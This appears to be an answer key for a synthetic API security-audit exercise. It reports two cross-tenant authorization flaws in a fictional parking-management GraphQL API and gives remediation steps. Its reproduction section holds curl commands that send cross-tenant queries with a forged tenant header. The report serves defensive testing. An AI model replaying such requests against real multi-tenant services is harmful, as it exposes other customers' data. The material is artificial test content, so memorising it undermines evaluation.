# Expected Response

## System
- Domain: Parking / Smart City
- System: ParkIQ Management API
- Example ID: GQL-0050

## Priority Findings

### Finding 1: BOLA via Nested Resource Without Parent Authorization — listIntersections Returns Cross-Tenant Parking Node Data (Pattern 1.7)
**Severity:** Critical
**Category:** BOLA / Nested Resource Access

**Summary:**
The `listIntersections` query on `POST /graphql` accepts a caller-supplied `tenantId`, returning parking intersection node data belonging to `tenant-f5d9` to an attacker from `tenant-7b28`. The resolver follows nested `nodeId`-based relationships without re-validating authorization at the parent or child level (Pattern 1.7). In a smart city / parking management context, accessing cross-tenant intersection topology data exposes parking bay availability, sensor data, and capacity configurations.

**Evidence from HAR:**
- Request: `POST https://api.parkiq-management-ap.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-7b28` — attacker's identity
- Query payload: `listIntersections(tenantId: "tenant-f5d9") { nodeId ownerId data { sensitiveField } }` — cross-tenant parking nodes enumerated
- Response HTTP status: `200 OK`
- Response `tenantId`: `tenant-f5d9`
- Response `ownerId`: `other-user-7b28f5d9`
- Response `sensitiveField`: `CONFIDENTIAL-7b28f5d9`
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-7b28f5d9`

**Root Cause (§4.0 RISK-GQL-050 + §5.0):** The `getIntersection` resolver fetches by `nodeId` only, without verifying `tenantId`. `listIntersections` accepts caller-supplied `tenantId`.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-050 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 1.7 | "resolver does not enforce ownership — nested resources without parent authorization" |
| HAR entry | request.postData | `listIntersections(tenantId: "tenant-f5d9")` from `tenant-7b28` |
| HAR entry | response.content | `tenantId: "tenant-f5d9"`, `sensitiveField: "CONFIDENTIAL-7b28f5d9"` |

---

### Finding 2: Cross-Tenant Bulk Parking Node Enumeration via bulkIntersectionLookup (Pattern 1.9)
**Severity:** High
**Root Cause (§4.0):** "`bulkIntersectionLookup` accepts an arbitrary array of IDs without per-ID ownership filtering."

---

## Steps to Reproduce

### Step 1 — Cross-tenant intersection enumeration (HAR attack)
```bash
curl -s -X POST https://api.parkiq-management-ap.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-7b28" \
  -d '{"query": "query VulnerableOp { listIntersections(tenantId: \"tenant-f5d9\") { nodeId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-f5d9"`, `ownerId: "other-user-7b28f5d9"`, `sensitiveField: "CONFIDENTIAL-7b28f5d9"`.
**Secure outcome:** HTTP 403 or FORBIDDEN.

### Step 2 — Bulk cross-tenant intersection lookup
```bash
curl -s -X POST https://api.parkiq-management-ap.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-7b28" \
  -d '{"query": "mutation { bulkIntersectionLookup(ids: [\"N-f5d9-001\", \"N-f5d9-002\"]) { nodeId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns `tenant-f5d9` parking nodes in bulk.

## Remediation
1. **Ignore caller-supplied tenantId in listIntersections:** Derive from JWT.
2. **Resolver tenant guard on getIntersection:** `WHERE node_id = $id AND tenant_id = $jwt.tenantId`.
3. **Per-ID ownership filter in bulkIntersectionLookup.**
4. **Redis cache key includes tenantId:** §2.0 caches by `nodeId` only — change to `nodeId:tenantId`.
